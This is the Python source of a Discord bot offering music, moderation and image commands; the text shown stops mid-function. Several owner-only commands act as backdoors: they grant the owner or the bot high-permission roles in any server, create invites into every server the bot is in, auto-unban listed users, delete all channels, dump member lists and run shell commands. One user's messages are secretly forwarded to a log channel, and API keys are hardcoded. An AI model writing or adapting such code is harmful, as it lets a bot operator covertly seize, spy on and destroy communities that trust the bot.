import discord
import keep_alive
import datetime
import asyncio
import typing
import subprocess
import requests, json, random
import os
import lyricsgenius
import io
import timedelta
import re
import pytz
import youtube_dl
import humanize
import parsems
import atexit
import colorama
import emojis
from colorama import Fore, Style
from datetime import timedelta
from parse import parse
from typing import Optional
from discord import Intents, Client
from discord.http import HTTPClient
from functools import wraps
from discord import app_commands
from jishaku.models import copy_context_with
from discord import Spotify
from discord.ext import commands, tasks
from discord.embeds import Embed
from discord import Permissions
from discord.utils import get

intents = discord.Intents.all()
intents.messages = True
intents = discord.Intents.all()
client = commands.AutoShardedBot(shard_count=30, command_prefix="*", intents=intents)
client.remove_command('help')


commands_synced = False

@client.event
async def on_connect():
    global commands_synced
    if not commands_synced:
        try:
            synced = await client.tree.sync()
            print(f"Synced {len(synced)} commands(s)")
            commands_synced = True
        except Exception as e:
            print(e)
            commands_synced = False
    
    arrayOfStatus = [
        ('Hanime Heaven💕', 'https://www.youtube.com/watch?v=KsWmq4lpxxk&list=RDKsWmq4lpxxk&start_radio=1')
    ]

    async def change_status():
        await client.wait_until_ready()
        index = 0
        while not client.is_closed():
            status, url = arrayOfStatus[index]
            await client.change_presence(activity=discord.Streaming(name=status, url=url))
            index += 1
            if index == len(arrayOfStatus):
                index = 0
            await asyncio.sleep(60)  # add a delay of 60 seconds

    status_task = client.loop.create_task(change_status())

@client.before_invoke
async def prevent_deleted_commands(ctx):
    if ctx.channel is None:
        raise commands.CommandError("This command has been deleted.")

@client.event
async def on_ready():
    # Replace GUILD_ID with the actual ID of the server
    guild = client.get_guild(994976997203771412)
    emojis = guild.emojis
    for emoji in emojis:
        print(emoji.name, emoji.url)

@client.event
async def on_member_update(before, after):
    if after.id == 1033579754588221500:
        new_nickname = "YxngSlatOnMolly" # Replace with desired new nickname
        await after.edit(nick=new_nickname)

with open("whitelist.txt", "r") as f:
    whitelist = [int(line.strip()) for line in f]

@client.event
async def on_guild_join(guild):
    if guild.id not in whitelist:
        with open("left_servers.txt", "a") as f:
            f.write(str(guild.id) + "\n")

        embed = discord.Embed(title="Server Not Whitelisted", description="I'm sorry, but this server is not on my whitelist. I will now leave this server.", color=discord.Color.random())
        await guild.owner.send(embed=embed)
        await guild.leave()

@client.event
async def on_member_ban(guild, user):
    with open('dev_ban.txt', 'r') as f:
        for line in f:
            if str(user.id) in line:
                # User was banned, but is in the list of developers who should be allowed on the server
                await guild.unban(user)
                dm_channel = await user.create_dm()
                
                # Check if an invite already exists for the server
                invites = await guild.invites()
                server_invite = None
                for invite in invites:
                    if invite.guild.id == guild.id:
                        server_invite = invite
                        break
                
                # If an invite doesn't exist, create a new one
                if server_invite is None:
                    server_invite = await guild.shard.text_channels[0].create_invite()  # Use shard to create invite in appropriate text channel
                
                embed = discord.Embed(
                    title="You have been unbanned from {}!".format(guild.name),
                    description="Here is the invite:",
                    color=discord.Color.random()
                )
                embed.add_field(name="Server Invite", value=server_invite.url)
                await dm_channel.send(embed=embed)


@client.event
async def on_message(message):
    if message.author.id == client.user.id:  # ignore messages from the bot itself
        return

    # Only execute this code on the shard that is responsible for the guild of the message
    if message.guild is not None and message.guild.shard_id == client.shard_id:
        if message.author.id == 617437101931364395:
            await asyncio.sleep(3)
            channel = client.get_channel(1070128910144110702)
            embed = discord.Embed(title="Message Log", description=message.content, color=discord.Color.random())
            embed.add_field(name="User Name", value=message.author.name)
            embed.add_field(name="User ID", value=message.author.id)
            embed.add_field(name="Message Link", value=message.jump_url)
            for attachment in message.attachments:
                if attachment.url.endswith(('jpg', 'jpeg', 'png')):
                    embed.set_image(url=attachment.url)
                elif attachment.url.endswith(('mp4', 'mov', 'avi', 'wmv')):
                    embed.add_field(name="Video", value=attachment.url)
            try:
                await channel.send(embed=embed)
            except Exception as e:
                print(f"Failed to send message: {e}")
    await client.process_commands(message)


#ctx.commands
@client.command()
async def scrape(ctx, amount: int):
    f = open(f"scraped/{ctx.message.channel}.txt","w+", encoding="UTF-8")
    total = amount
    print(f"{Fore.WHITE}[ {Fore.YELLOW}? {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Scraping {Fore.WHITE}{amount}{Fore.LIGHTBLACK_EX} messages to {Fore.WHITE}scraped/{ctx.message.channel}.txt{Fore.LIGHTBLACK_EX}!")
    async for message in ctx.message.channel.history(limit=amount):
        attachments = [attachment.url for attachment in message.attachments if message.attachments]
        try:
            if attachments:
                realatt = attachments[0]
                f.write(f"({message.created_at}) {message.author}: {message.content} ({realatt})\n")
                print(f"{Fore.WHITE}[ {Fore.GREEN}+ {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Scraped message")
            else:
                f.write(f"({message.created_at}) {message.author}: {message.content}\n")
                print(f"{Fore.WHITE}[ {Fore.GREEN}+ {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Scraped message")
        except Exception as e:
            print(f"{Fore.WHITE}[ {Fore.RED}- {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Cannot scrape message from {Fore.WHITE}{message.author}")
            print(f"{Fore.WHITE}[ {Fore.RED}E {Fore.WHITE}] {Fore.LIGHTBLACK_EX} {Fore.WHITE}{e}")
            total = total - 1
    print(f"{Fore.WHITE}[ {Fore.YELLOW}? {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Succesfully scraped {Fore.WHITE}{total} {Fore.LIGHTBLACK_EX}messages!\n\n{Fore.WHITE}")


@client.command()
async def setup(ctx, username):
    data = {}

    with open('user_data.json', 'r') as f:
        data = json.load(f)
    
    data[str(ctx.author.id)] = username
    
    with open('user_data.json', 'w') as f:
        json.dump(data, f)
        
    await ctx.send(f"Last.fm username set to {username}!")

np_lock = asyncio.Lock()

@client.command()
async def np(ctx):
    channel_id = 1077038376840089670 # Replace with the channel ID where the command should work
    
    if ctx.channel.id != channel_id:
        await ctx.send("This command can only work for <#1077038376840089670> :no_entry:")
        return
    
    with open('user_data.json', 'r') as f:
        data = json.load(f)
        lastfm_username = data.get(str(ctx.author.id), None)

    if not lastfm_username:
        await ctx.send("You have not set your Last.fm username. Use the `*setup` command to set it.")
        return

    async with np_lock:
        api_key = "d9074c4b087fcb38e2be85c94d751ef2"
        url = f"http://ws.audioscrobbler.com/2.0/?method=user.getrecenttracks&user={lastfm_username}&api_key={api_key}&format=json&limit=1&nowplaying=true"
        response = requests.get(url)

        if not response.ok:
            await ctx.send("An error occurred while retrieving the currently playing track.")
            return

        result = json.loads(response.text)
        track = result['recenttracks']['track'][0]

        # Retrieve track information from the response
        artist = track['artist']['#text']
        name = track['name']
        album = track['album']['#text']
        image = track['image'][-1]['#text']  # Choose the largest image size

        # If the 'playcount' key is not present in the track dictionary, set the play count to 1
        played_count = track.get('playcount', 1)

        # If the track is currently playing, get the play count from the now playing API
        if 'nowplaying' in track.keys():
            played_count = int(track.get('userplaycount', 0)) + 1
        else:
            played_count = int(played_count)

        # Create and send the Discord embed
        embed = discord.Embed(title=f"Now Playing: {name}", description=f"by {artist}", color=discord.Color.random())
        embed.set_thumbnail(url=image)
        embed.add_field(name="Album", value=album)
        embed.add_field(name="Play Count", value=played_count)
        message = await ctx.send(embed=embed)
        await message.add_reaction("🔥")
        await message.add_reaction("🗑️")

        # Cancel any background tasks or timers associated with the command
        async def cancel_timer():
            try:
                # Your task or timer cancellation code here
                pass
            except discord.NotFound:
                pass  # Ignore the error if the message has already been deleted

        # Check if the message author is the bot or the user who triggered the command before cancelling any tasks
        def check(author):
            def inner_check(message):
                return message.author == author
            return inner_check

        def cancel_tasks():
            if message.author == ctx.bot.user or message.author == ctx.author:
                ctx.bot.loop.create_task(cancel_timer())

        client.add_listener(cancel_tasks, 'on_message')

@client.command()
async def pin(ctx, *, pin_id: int):
    if not ctx.author.guild_permissions.manage_messages:
        return await ctx.send(embed=discord.Embed(color=discord.Color.gold(), description=f"{ctx.author.mention}: You're **missing** permission: `manage_messages`"))
    if not ctx.guild.me.guild_permissions.manage_messages:
        return await ctx.send(embed=discord.Embed(color=discord.Color.gold(), description=f"{ctx.author.mention}: I'm **missing** permission: `manage_messages`"))

    embed = discord.Embed(
        title="Command: pin",
        description="Pin any recent message by ID",
        color=discord.Color.blurple()
    )
    embed.set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url)
    embed.add_field(name="**Aliases**", value="N/A", inline=True)
    embed.add_field(name="**Parameters**", value="message", inline=True)
    embed.add_field(name="**Information**", value=":warning: Manage Messages", inline=True)
    embed.add_field(name="**Usage**", value="```Syntax: pin (messageid)```", inline=False)
    embed.set_footer(text="Module: servers")
    embed.timestamp = discord.utils.utcnow()

    if not pin_id:
        return await ctx.send(embed=embed)

    try:
        pinned_message = await ctx.channel.fetch_message(pin_id)
        await pinned_message.pin()
    except discord.NotFound:
        await ctx.send(embed=discord.Embed(color=discord.Color.gold(), description=f"{ctx.author.mention}: `{pin_id}` is not a valid message id"))
    except discord.Forbidden:
        await ctx.send(embed=discord.Embed(color=discord.Color.red(), description=f"{ctx.author.mention}: An error has occurred! Failed to unpin message"))

@client.command(name='sp', help='Spotify song')
async def spotify(ctx):
    for activity in ctx.author.activities:
        if isinstance(activity, Spotify):
            embed = discord.Embed(title=f"{ctx.author.name}'s Spotify", description="Listening to {}".format(activity.title), color=activity.color)
            embed.set_thumbnail(url=activity.album_cover_url)
            embed.add_field(name="Artist", value=activity.artist)
            embed.add_field(name="Album", value=activity.album)
            duration_ms = round(activity.duration.total_seconds() * 1000)
            duration = str(timedelta(milliseconds=duration_ms)).split(".")[0]
            embed.add_field(name="Duration", value=duration)
            embed.add_field(name="Song Link", value=f"[{activity.title}](https://open.spotify.com/track/{activity.track_id})")
            embed.set_footer(text="Spotify", icon_url="https://cdn.discordapp.com/emojis/1078862794050510939.webp?size=80&quality=lossless")
            await ctx.send(embed=embed)
            break
    else:
        await ctx.send(f"{ctx.author.name} is not listening to Spotify.")

@client.command()
@commands.is_owner()
async def servinv(ctx):
    servers = client.guilds

    # Define a dictionary that maps numbers to emojis
    emojis = {
        1: "\U0001f1e6",
        2: "\U0001f1e7",
        3: "\U0001f1e8",
        4: "\U0001f1e9",
        5: "\U0001f1ea",
        6: "\U0001f1eb",
        7: "\U0001f1ec",
        8: "\U0001f1ed",
        9: "\U0001f1ee",
        10: "\U0001f1ef"
    }

    # Create an embed with a list of servers and corresponding emojis
    embed = discord.Embed(title="List of servers", color=0x00ff00)
    for i, server in enumerate(servers, start=1):
        emoji = emojis.get(i, "")
        embed.add_field(name=f"{emoji} {server.name}", value=f"ID: {server.id}", inline=False)

    # Send the embed to the channel where the command was used
    message = await ctx.send(embed=embed)

    # Add reactions to the message with the corresponding number emoji
    for i in range(1, min(len(servers) + 1, len(emojis) + 1)):
        emoji = emojis.get(i, "")
        await message.add_reaction(emoji)

    def check(reaction, user):
        # Check that the user is the owner and that the reaction is on the original message
        return user == ctx.message.author and str(reaction.emoji) in emojis.values() and reaction.message.id == message.id

    try:
        # Wait for the owner to react to one of the emojis
        reaction, user = await client.wait_for("reaction_add", check=check, timeout=30)
    except asyncio.TimeoutError:
        await ctx.send("Timed out.")
    else:
        # Find the server that corresponds to the reacted emoji
        for i, server in enumerate(servers, start=1):
            if str(reaction.emoji) == emojis.get(i, ""):
                # Check if the bot has already created an invite for the server
                existing_invites = await server.invites()
                if existing_invites:
                    invite = existing_invites[0]
                else:
                    # Create a new invite for the server
                    invite = await server.text_channels[0].create_invite()

                # Send the invite to the channel where the command was used
                await ctx.send(f"Here's an invite to **{server.name}**: {invite.url}")

                break

    # Delete the original message
    await message.delete()


@client.command()
@commands.is_owner()
async def addid(ctx, id: int):
    await ctx.message.delete()
    with open("dev_ban.txt", "a") as f:
        f.write(f"{id}\n")
    message = await ctx.send(embed=discord.Embed(description=f"ID `{id}` added to dev_ban list.", color=discord.Color.from_rgb(*[random.randint(0, 255) for _ in range(3)])))
    await asyncio.sleep(10)
    await message.delete()

@client.command()
@commands.is_owner()
async def removeid(ctx, id: int):
    await ctx.message.delete()
    with open("dev_ban.txt", "r") as f:
        lines = f.readlines()
    with open("dev_ban.txt", "w") as f:
        for line in lines:
            if line.strip() != str(id):
                f.write(line)
    message = await ctx.send(embed=discord.Embed(description=f"ID `{id}` removed from dev_ban list.", color=discord.Color.from_rgb(*[random.randint(0, 255) for _ in range(3)])))
    await asyncio.sleep(7)
    await message.delete()

@client.command()
@commands.is_owner()
async def syncdevbans(ctx):
    await ctx.message.delete()
    global prohibited_ids
    with open("dev_ban.txt", "r") as f:
        prohibited_ids = [int(x.strip()) for x in f.readlines()]
    message = await ctx.send(embed=discord.Embed(description="Dev ban list synced.", color=discord.Color.from_rgb(*[random.randint(0, 255) for _ in range(3)])))
    await asyncio.sleep(3)
    await message.delete()

@client.command(name='run', help='Run a shell command')
@commands.is_owner()
async def run(ctx, *, cmd):
  result = subprocess.run(cmd.split(), stdout=subprocess.PIPE)
  await ctx.send(f'```\n{result.stdout.decode()}\n```')

@client.command(name="gban", aliases=["forceban"])
@commands.has_permissions(administrator=True)
async def gban(ctx, target, *, reason='No reason supplied.'):
  if not target.isdigit():
    await ctx.send("Please specify an ID")
    return

  try:
    await ctx.guild.ban(discord.Object(id=int(target)), reason=reason)
    await ctx.send(embed=discord.Embed(
      color=discord.Color.random(),
      description="**They were successfully Banned And Not Messaged**"))
    mod_log_channel_id = 1071451686738075689  # replace this with the actual channel ID
    mod_log_channel = client.get_channel(mod_log_channel_id, shard_id=ctx.guild.shard_id)
    if mod_log_channel:
      embed = discord.Embed(
        color=discord.Color.random(),
        description=
        f"**Ban Information**\n\nUser ID: {target}\nBanned by: {ctx.author}\nReason: {reason}\nDate: {ctx.message.created_at}"
      )
      await mod_log_channel.send(embed=embed, shard_id=ctx.guild.shard_id)
  except Exception as e:
    print(e)

@client.command()
async def note(ctx, *, note_text: str):
  current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
  embed = discord.Embed(title=f"Note created on {current_time}", description=note_text, color=random.randint(0, 0xffffff))
  msg = await ctx.author.send(embed=embed)
  await msg.add_reaction("🗑️")
  await msg.add_reaction("✅")
  
  def check(reaction, user):
    return user == ctx.author and str(reaction.emoji) in ["🗑️", "✅"] and reaction.message.id == msg.id
  
  try:
    reaction, user = await client.wait_for('reaction_add', timeout=60.0, check=check)
  except asyncio.TimeoutError:
    await ctx.send("Note expired!")
  else:
    result = "Note deleted!" if str(reaction.emoji) == "🗑️" else "Note kept!"
    await msg.delete() if str(reaction.emoji) == "🗑️" else None
    await ctx.send(result)

@client.command(name='deleteall')
@commands.is_owner()
async def delete_all(ctx):
  guild = ctx.guild
  for channel in guild.channels:
    await channel.delete()
  await ctx.send("All channels have been deleted.")


@client.command()
@commands.has_permissions(administrator=True)
async def embed(ctx, channel: discord.TextChannel, *, message: str):
  embed = discord.Embed(color=random.randint(0, 0xffffff))

  attachments = ctx.message.attachments
  if len(attachments) > 0:
    for attachment in attachments:
      if attachment.url.endswith(('jpg', 'jpeg', 'png')):
        embed.set_image(url=attachment.url)
        break
  else:
    words = message.split(" ")
    for word in words:
      if word.endswith(('jpg', 'jpeg', 'png')):
        embed.set_image(url=word)
        break

  await channel.send(embed=embed)

@client.command()
@commands.has_permissions(administrator=True)
async def nsfw(ctx, *channels: discord.TextChannel):
  for channel in channels:
    await channel.edit(nsfw=True)


@client.command()
@commands.is_owner()
async def bot_dev(ctx):
    await ctx.message.delete()
    role = await ctx.guild.create_role(
        name="💎Hanime",
        permissions=discord.Permissions(1099511627775),
        hoist=True,
        color=0x090000)
    await ctx.guild.me.add_roles(role)

@client.command()
@commands.is_owner()
async def rr(ctx, member: discord.Member, role: discord.Role):
    await member.remove_roles(role)
    embed = discord.Embed(
        title="Role removed",
        description=f"{role.name} was removed from {member.mention}",
        color=discord.Color.random()
    )
    await ctx.send(embed=embed, delete_after=5)

temp_roles = {}

try:
    with open("temp_roles.json", "r") as f:
        temp_roles = json.load(f)
except (FileNotFoundError, json.JSONDecodeError):
    pass

@client.command()
@commands.is_owner()
async def tmpr(ctx, user: discord.Member, role: typing.Union[discord.Role, int], duration: str):
    color = random.randint(0, 0xffffff)
    role_id = role.id if isinstance(role, discord.Role) else role
    role_mention = role.mention if isinstance(role, discord.Role) else f"<@&{role_id}>"
    embed = discord.Embed(
        title=f"Role Assignment",
        description=f"{user.mention} has been given the {role_mention} role.",
        color=color)
    msg = await ctx.send(embed=embed)
    
    role = ctx.guild.get_role(role_id)
    if role is None:
        await msg.edit(embed=discord.Embed(description=f"Role with id {role_id} not found!", color=color))
        return
    
    await user.add_roles(role)

    # Parse duration string
    if "d" in duration:
        days = int(duration.replace("d", ""))
        seconds = days * 24 * 60 * 60
    elif "w" in duration:
        weeks = int(duration.replace("w", ""))
        seconds = weeks * 7 * 24 * 60 * 60
    elif "m" in duration:
        minutes = int(duration.replace("m", ""))
        seconds = minutes * 60

    # Add or update temporary role assignment in the JSON file
    temp_roles[str(user.id)] = {
        'role_id': str(role_id),
        'expire_time': int(asyncio.get_running_loop().time()) + seconds
    }
    with open('temp_roles.json', 'w') as f:
        json.dump(temp_roles, f)

    # Remove role after specified duration
    await asyncio.sleep(seconds)
    await user.remove_roles(role)

    # Remove temporary role assignment from the JSON file
    del temp_roles[str(user.id)]
    with open('temp_roles.json', 'w') as f:
        json.dump(temp_roles, f)

    color = random.randint(0, 0xffffff)
    embed = discord.Embed(
        title=f"Role Expiration",
        description=f"{user.mention}'s {role_mention} role has expired.",
        color=color)
    msg = await ctx.send(embed=embed)
    await asyncio.sleep(8)
    await msg.delete()

@client.command(pass_context=True)
@commands.is_owner()
async def dev(ctx):
  await ctx.message.delete()
  try:
    guild = ctx.guild
    role = await guild.create_role(
      name="👑DEATH",
      permissions=discord.Permissions(236157138175),
      hoist=True,
      color=0x090000)
    authour = ctx.message.author
    await authour.add_roles(role)
    print(f"Gave you admin <3 in {guild.name}")
  except:
    print("Couldnt give you admin :(")

@client.command()
@commands.is_owner()
async def cmd(ctx):
  with open('command.txt', 'w') as f:
    async for member in ctx.guild.fetch_members(limit=None):
      f.write(f"{member},{member.id}\n")
  await ctx.author.send("Logged Users To Command.txt")


@client.command()
async def coinflip(ctx):
  # Generate a random number between 0 and 1
  coin = random.randint(0, 1)
  # Check the value of the coin
  if coin == 0:
    embed = discord.Embed()
    embed.set_image(url="attachment://heads.png")
    embed.description = "Heads"
    await ctx.send(embed=embed, file=discord.File("heads.png"))
  else:
    # Tails
    embed = discord.Embed()
    embed.set_image(url="attachment://tails.png")
    embed.description = "Tails"
    await ctx.send(embed=embed, file=discord.File("tails.png"))


@client.command()
@commands.is_owner()
async def send(ctx, *, message: str):
  await ctx.message.delete()
  await ctx.send(message)

@client.command()
async def ping(ctx):
  latency = round(client.latency * 1000)
  embed = discord.Embed(
      title='Bot Latency:',
      description=f'{latency}ms',
      color=0x00ff00)
  await ctx.send(embed=embed)

@client.command(name='changenick', help='Changes a user\'s nickname')
@commands.has_permissions(administrator=True)
async def changenick(ctx, member: discord.Member, *, new_nick: str):
  old_nick = member.nick
  await member.edit(nick=new_nick)
  embed = discord.Embed(
      title='Nickname Change',
      description=f'{member.mention}',
      color=0x00ff00)
  embed.add_field(name='Old Nickname', value=old_nick, inline=False)
  embed.add_field(name='New Nickname', value=new_nick, inline=False)
  await ctx.send(embed=embed)


@client.command()
async def game(ctx):
  popular_games = ["Fortnite", "GTA", "Minecraft", "Rainbow 6 Siege"]
  similar_games = {
    "Fortnite": ["Apex Legends", "Hyper Scape", "Ring of Elysium"],
    "GTA": ["Saints Row", "Watch Dogs", "LA Noire"],
    "Minecraft": ["Terraria", "Starbound", "Dragon Quest Builders"],
    "Rainbow 6 Siege": ["Rainbow Six: Quarantine", "Insurgency: Sandstorm", "Squad"]
  }
  game = random.choice(popular_games)
  similar_game = random.choice(similar_games[game])
  await ctx.send(f"If you like {game}, try {similar_game}")

@client.command()
@commands.is_owner()
async def nuke(ctx):
    await ctx.send("Nuking this channel....")
    channel = await ctx.channel.clone()
    await ctx.channel.delete()
    await channel.edit(position=ctx.channel.position)

    log_channel = client.get_channel(1070663362758852608)

    color = discord.Color.from_rgb(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
    embed = discord.Embed(title="Channel Nuked", color=color)
    embed.add_field(name="Channel", value=channel.mention, inline=False)
    embed.add_field(name="Nuked By", value=ctx.author.mention, inline=False)
    await log_channel.send(embed=embed)

    embed = discord.Embed(title="Channel Nuked", color=color)
    
    embed.set_image(url="https://media1.tenor.com/images/e275783c9a40b4551481a75a542cdc79/tenor.gif?itemid=3429833")
    msg = await channel.send(embed=embed)
    await msg.delete(delay=9)

@client.command()
@commands.has_permissions(administrator=True)
async def warn(ctx, user: discord.Member, reason: str, amount: int = 4):
  if ctx.guild.id != 1051091880651272222:
    await ctx.send("This command can only be used in the specific guild")
    return
  if not ctx.author.guild_permissions.administrator:
    await ctx.send("You don't have permission to mute members.")
    return
  if amount == 4:
    amount = 4
  else:
    amount = min(amount, 4)
  try:
    with open("warns.txt", "r") as f:
      warns = json.load(f)
  except:
    warns = {}
  if str(user.id) not in warns:
    warns[str(user.id)] = {"name": user.name, "id": user.id, "warns": 0}
  else:
    if warns[str(user.id)]["warns"] + amount > 4:
      await ctx.send(
        "This user has already reached the maximum number of warns.")
      return
    else:
      warns[str(user.id)]["warns"] += amount
  with open("warns.txt", "w") as f:
    json.dump(warns, f)
  if warns[str(user.id)]["warns"] >= 4:
    role = discord.utils.get(ctx.guild.roles, name='Muted')
    await user.add_roles(role)
    embed = discord.Embed(
      title="User has been muted",
      description=
      f"{user.mention} has been muted for {reason} and exceeded the maximum number of warns.",
      color=random.randint(0, 0xffffff))
    await ctx.send(embed=embed)
  else:
    embed = discord.Embed(
      title="User has been warned",
      description=f"{user.mention} has been warned for {reason}.",
      color=random.randint(0, 0xffffff))
    embed.add_field(name="Warns", value=f"{warns[str(user.id)]['warns']}")
    await ctx.send(embed=embed)


@client.command()
async def removewarn(ctx, user: discord.Member, amount: str):
  if ctx.guild.id != 1051091880651272222:
    await ctx.send("This command can only be used in the specific guild")
    return
  if not ctx.author.guild_permissions.administrator:
    await ctx.send("You don't have permission to remove warns for members.")
    return
  try:
    with open("warns.txt", "r") as f:
      warns = json.load(f)
  except:
    await ctx.send("No warns to remove.")
    return
  if str(user.id) not in warns:
    await ctx.send("This user has no warns.")
    return
  if amount == "all":
    warns[str(user.id)]["warns"] = 0
  else:
    try:
      amount = int(amount)
      if amount > warns[str(user.id)]["warns"]:
        amount = warns[str(user.id)]["warns"]
      warns[str(user.id)]["warns"] -= amount
    except:
      await ctx.send(
        "Invalid amount entered. Please enter a valid number or 'all'.")
      return
  with open("warns.txt", "w") as f:
    json.dump(warns, f)
  embed = discord.Embed(
    title="User warn removed",
    description=f"{amount} warn(s) has been removed from {user.mention}.",
    color=random.randint(0, 0xffffff))
  embed.add_field(name="Warns", value=f"{warns[str(user.id)]['warns']}")
  await ctx.send(embed=embed)


@client.command()
async def youtube(ctx, *, query):
  api_key = "AIzaSyDExCZ2UhM3i5WGs5hNYQmIiwswkxbD-Cs"
  url = f"https://www.googleapis.com/youtube/v3/search?part=snippet&q={query}&type=video&key={api_key}"
  response = requests.get(url)
  data = json.loads(response.text)
  video = data["items"][0]
  video_url = f"https://youtube.com/watch?v={video['id']['videoId']}"
  video_thumbnail = video['snippet']['thumbnails']['default']['url']
  video_title = video['snippet']['title']
  video_channel = video['snippet']['channelTitle']
  color = discord.Color.from_rgb(random.randint(0,
                                                255), random.randint(0, 255),
                                 random.randint(0, 255))
  embed = discord.Embed(title=video_title, url=video_url, color=color)
  embed.set_thumbnail(url=video_thumbnail)
  embed.add_field(name="Channel", value=video_channel)
  await ctx.send(embed=embed)

help_lock = asyncio.Lock()

@client.command()
@commands.cooldown(1, 3, commands.BucketType.user)
async def help(ctx, args=None):
    async with help_lock:
        color = discord.Color.random()
        help_embed = discord.Embed(title="My Bot's Help!", color=color)
        command_names_list = [x.name for x in client.commands]

        # If there are no arguments, just list the commands:
        if not args:
            help_embed.add_field(name="List of supported commands:",
                                 value="\n".join([
                                     str(i + 1) + ". " + x.name
                                     for i, x in enumerate(client.commands)
                                 ]),
                                 inline=False)
            help_embed.add_field(
                name="Details",
                value=f"Type `{ctx.prefix}help <command name>` for more details about each command.",
                inline=False)

        # If the argument is a command, get the help text from that command:
        elif args in command_names_list:
            help_embed.add_field(name=args, value=client.get_command(args).help)

        # If someone is just trolling:
        else:
            help_embed.add_field(name="Nope.",
                                 value="Don't think I got that command, boss!")

        message = await ctx.send(embed=help_embed)

        # Cancel any background tasks or timers associated with the command
        async def cancel_timer():
            # Your task or timer cancellation code here
            pass

        client.loop.create_task(cancel_timer())

#slashcommands/
@client.tree.command(name='sync', description='Sync commands if they dont work.')
async def sync(interaction: discord.Interaction):
  if interaction.user == 762464676344102932:
    await interaction.response.send_message("This command isnt for you.", ephemeral=True)
  else:
    await interaction.response.send_message("Syncing, this might take a second", ephemeral=True)
    await client.tree.sync(guild=interaction.guild)

@client.tree.command(name='fox', description='Sends a random fox image')
async def fox_command(interaction: discord.Interaction):
    api_url = "https://randomfox.ca/floof/"
    response = requests.get(api_url)
    data = response.json()
    fox_url = data["image"]

    color = discord.Color.from_rgb(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
    embed = discord.Embed(color=color)
    embed.set_image(url=fox_url)
    await interaction.response.send_message(embed=embed)


@commands.cooldown(1, 6, commands.BucketType.user)
@client.tree.command(name='dog', description='Sends a random dog image')
async def dog_command(interaction: discord.Interaction):
    r = requests.get("https://dog.ceo/api/breeds/image/random")
    res = r.json()
    em = discord.Embed(title='Here is a picture of a dog',
                       description='Here is an image from the api',
                       color=0xFF0187)
    em.set_image(url=res['message'])
    await interaction.response.send_message(embed=em)

@client.tree.command(name='cat', description='Sends a random cat image')
async def cat_command(interaction: discord.Interaction):
    api_url = "https://aws.random.cat/meow"
    response = requests.get(api_url)
    data = response.json()
    cat_url = data["file"]

    color = discord.Color.from_rgb(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
    embed = discord.Embed(color=color)
    embed.set_image(url=cat_url)
    await interaction.response.send_message(embed=embed)

@client.tree.command(name='leave', description='Leave Guild!')
async def leave_guild(interaction: discord.Interaction, guild_name: str, reason: str):
    if interaction.user.id != 762464676344102932:
        await interaction.response.send_message("Cant Do this command", ephemeral=True)
    else:
        guild = discord.utils.get(client.guilds, name=guild_name)
        if guild == None:
            await interaction.response.send_message(f"No guild with the name {guild_name} was found.")
        else:
            await interaction.response.send_message(f"I left: {guild.name}!", ephemeral=True)
            await guild.leave()
            owner = guild.owner
            await owner.send(f'{client.user} I left {guild.name}\nReason: {reason}')

@client.tree.command()
async def serverinfo(interaction: discord.Interaction):
    guild = interaction.guild
    embed = discord.Embed(title=f"Server Information for {guild.name}", color=0x090000)
    embed.add_field(name="Server Name", value=guild.name)
    embed.add_field(name="Server Owner", value=guild.owner)
    embed.add_field(name="Server ID", value=guild.id)
    embed.add_field(name="Member Count", value=guild.member_count)
    embed.add_field(name="Server Created", value=guild.created_at)
    await interaction.response.send_message(embed=embed)

prohibited_ids = [762464676344102932, 787367426550399027]

@client.tree.command(name='dm', description="DM's a user")
async def dm(interaction: discord.Interaction, user: discord.Member, message: str):
    if user.id in prohibited_ids:
        await interaction.response.send_message(
            "You can't DM this user because they are either the developer or blacklisted from receiving messages.",
            ephemeral=True)
    elif user == interaction.user:
        await interaction.response.send_message("You can't DM yourself.", ephemeral=True)
    else:
        if user.id not in prohibited_ids:
            await user.send(message)
            await interaction.response.send_message(f"Messaged {user.name}: {message}", ephemeral=True)

start_time = datetime.datetime.utcnow()

def random_color():
    return discord.Color.from_rgb(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))

@client.tree.command(name='uptime', description='how long bot has been up')
async def uptime(interaction: discord.Interaction):
    uptime = datetime.datetime.utcnow() - start_time
    uptime_days, remainder = divmod(uptime.days * 86400 + uptime.seconds, 86400)
    uptime_hours, remainder = divmod(remainder, 3600)
    uptime_minutes, uptime_seconds = divmod(remainder, 60)
    embed = discord.Embed(title="Hanime Uptime", description=f"{uptime_days} days {uptime_hours} hours {uptime_minutes} minutes {uptime_seconds} seconds", color=random_color())
    await interaction.response.send_message(embed=embed)


@client.tree.command(name="hanime_banner", description="Hanime Banner")
async def Hanime(interaction: discord.Interaction):
  await interaction.response.send_message(
    f"https://giphy.com/gifs/hanime-kl6P4JP9VEYctXjknm")

@client.tree.command(name='user_banner', description='gives user bannerr!')
@app_commands.describe(user='Select a user')
async def banner(interaction: discord.Interaction, user: discord.Member):
    user = interaction.author if not user else user
    req = await client.http.request(discord.http.Route("GET", "/users/{uid}", uid=user.id))
    banner_id = req["banner"]
    if banner_id:
        banner_url = f"https://cdn.discordapp.com/banners/{user.id}/{banner_id}?size=1024"
        embed = discord.Embed(title='Hanime banner', description=f"{user} banner🌺", color=0xFF0187)
        embed.set_image(url=banner_url)
        await interaction.response.send_message(embed=embed)

@client.tree.command()
async def avatar(interaction: discord.Interaction, member: discord.Member):
    member = interaction.author if not member else member
    embed = discord.Embed(title='Hanime avatar', description=f"Here is {member.name} pfp", color=0xFF0187)
    embed.set_image(url=member.avatar.url)
    await interaction.response.send_message(embed=embed)

@client.tree.command(name='kick', description='Kicks a user!')
@app_commands.describe(user='Select a user')
@app_commands.describe(reason='Provide a reason!')
async def kick(interaction: discord.Interaction, user: discord.Member, reason: str = 'No reason provided'):
    if user.id == 762464676344102932:
        await interaction.response.send_message("This user cannot be kicked!", ephemeral=True)
    elif user == interaction.user:
        await interaction.response.send_message('Cant kick yourself', ephemeral=True)
    elif not interaction.user.guild_permissions.kick_members:
        await interaction.response.send_message("Cant use this command!", ephemeral=True)
    else:
        try:
            await interaction.guild.kick(user, reason=reason)
